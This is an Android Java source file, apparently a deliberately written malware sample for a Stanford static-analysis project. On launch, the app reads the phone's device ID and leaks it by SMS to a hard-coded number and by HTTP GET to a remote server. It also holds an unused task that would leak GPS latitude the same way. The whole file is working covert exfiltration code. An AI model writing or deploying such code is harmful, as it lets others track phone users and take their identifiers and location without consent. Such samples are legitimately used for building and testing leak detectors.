package stamp.stanford.malware;

import android.app.Activity;
import android.app.PendingIntent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import java.io.IOException;
import java.net.MalformedURLException;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

public class Malware extends Activity {

    private static void performLeak(String msg) {
	String phoneNumber = "9995556677";
	if(phoneNumber.length()>0 && msg.length()>0) {
	    SmsManager sms = SmsManager.getDefault();
	    sms.sendMultipartTextMessage(phoneNumber, null, sms.divideMessage(msg), null, null);
	}
	    
	try {
	    HttpClient client = new DefaultHttpClient();
	    String getURL = "http://stanford.edu/~subodh/cgi-bin/stamp/id.php?gps=".concat(msg);
	    HttpGet get = new HttpGet(getURL);
	    HttpResponse responseGet = client.execute(get);
	    HttpEntity resEntityGet = responseGet.getEntity();
	    // if (resEntityGet != null) {
	    //     Log.i("GET RESPONSE",EntityUtils.toString(resEntityGet));
	    // }
	} catch (MalformedURLException e) {
	    e.printStackTrace();
	} catch (IOException e) {
	    e.printStackTrace();
	}
    }

    private class LeakInfo extends AsyncTask<String, Void, Void>{

	@Override 
	    protected Void doInBackground(String... params) {

	    LocationManager lm = (LocationManager)getSystemService(LOCATION_SERVICE);
	    performLeak(Double.toString(lm.getLastKnownLocation(LocationManager.GPS_PROVIDER).getLatitude()));

	    return null;
	}

    }
    
    /** Called when the activity is first created. */
    @Override
	public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

	LeakInfo li = new LeakInfo();

        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
	performLeak(tm.getDeviceId());

        setContentView(R.layout.main);
    }
    
    @Override
	public void onStart(){
	super.onStart();
    }
    
}
